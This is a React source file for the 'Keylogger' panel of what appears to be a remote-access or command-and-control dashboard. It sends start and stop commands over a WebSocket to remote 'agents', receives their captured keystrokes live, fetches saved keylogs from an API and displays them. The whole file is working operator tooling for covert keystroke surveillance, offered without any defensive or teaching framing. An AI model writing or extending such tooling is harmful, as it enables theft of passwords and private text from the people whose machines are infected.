import React, { useState, useEffect, useRef } from 'react';
import { RefreshCw, FileText, Play, Square } from 'lucide-react';
import { API_BASE_URL, WS_BASE_URL } from '../../config';

export default function Keylogger({ agentId }) {
    const [logs, setLogs] = useState("");
    const [loading, setLoading] = useState(false);
    const [running, setRunning] = useState(false);
    const wsRef = useRef(null);
    const logEndRef = useRef(null);

    useEffect(() => {
        const ws = new WebSocket(`${WS_BASE_URL}/ws/${agentId}`);
        ws.binaryType = 'arraybuffer';
        wsRef.current = ws;
        
        ws.onopen = () => console.log("[Keylog] WS Connected");

        ws.onmessage = (event) => {
            if (event.data instanceof ArrayBuffer) {
                const data = new Uint8Array(event.data);
                const decoder = new TextDecoder('utf-8');
                try {
                    const text = decoder.decode(data);
                    if (text.startsWith("KEYLOG:")) {
                        const newLog = text.substring(7);
                        setLogs(prev => prev + newLog);
                        if (logEndRef.current) {
                            logEndRef.current.scrollIntoView({ behavior: "smooth" });
                        }
                    }
                } catch(e) {}
            }
        };

        return () => {
            if (ws.readyState === WebSocket.OPEN) ws.close();
        };
    }, [agentId]);

    const fetchLogs = async () => {
        setLoading(true);
        try {
            const res = await fetch(`${API_BASE_URL}/api/agents/${agentId}/keylogs`);
            if (res.ok) {
                const text = await res.text();
                setLogs(text || "[No saved logs yet]");
            } else {
            }
        } catch (e) {
        }
        setLoading(false);
    };

    const toggleKeylogger = (start) => {
        if (!wsRef.current || wsRef.current.readyState !== WebSocket.OPEN) return;
        
        if (start) {
            wsRef.current.send("__START_KEYLOG__");
            setRunning(true);
            setLogs(prev => prev + "\n[Keylogger Started]\n");
        } else {
            wsRef.current.send("__STOP_KEYLOG__");
            setRunning(false);
            setLogs(prev => prev + "\n[Keylogger Stopped]\n");
        }
    };

    return (
        <div className="flex flex-col h-full bg-[#0c0c0c] text-gray-300 font-mono text-sm">
            <div className="bg-[#1a1a1a] border-b border-[#333] p-2 flex items-center gap-2">
                <button 
                    onClick={() => toggleKeylogger(true)} 
                    disabled={running}
                    className={`flex items-center gap-1 px-3 py-1.5 rounded-sm text-xs font-bold transition ${running ? 'bg-[#333] text-gray-500' : 'bg-green-900/20 text-green-400 hover:bg-green-500 hover:text-black'}`}
                >
                    <Play size={12} fill="currentColor"/> START
                </button>
                <button 
                    onClick={() => toggleKeylogger(false)} 
                    disabled={!running}
                    className={`flex items-center gap-1 px-3 py-1.5 rounded-sm text-xs font-bold transition ${!running ? 'bg-[#333] text-gray-500' : 'bg-red-900/20 text-red-400 hover:bg-red-500 hover:text-black'}`}
                >
                    <Square size={12} fill="currentColor"/> STOP
                </button>
                
                <div className="h-6 w-px bg-[#333] mx-1"></div>
                
                <button onClick={() => setLogs("")} className="p-1.5 hover:bg-[#333] rounded transition" title="Clear"><RefreshCw size={16}/></button>
                <div className="h-6 w-px bg-[#333] mx-1"></div>
                <span className="text-gray-500 text-xs font-bold flex items-center gap-1"><FileText size={12}/> Live Capture</span>
            </div>
            <div className="flex-1 overflow-auto p-4 bg-[#111] scrollbar-thin">
                <pre className="whitespace-pre-wrap text-xs text-green-400 font-mono leading-relaxed">
                    {logs}
                    <div ref={logEndRef} />
                </pre>
            </div>
        </div>
    );
}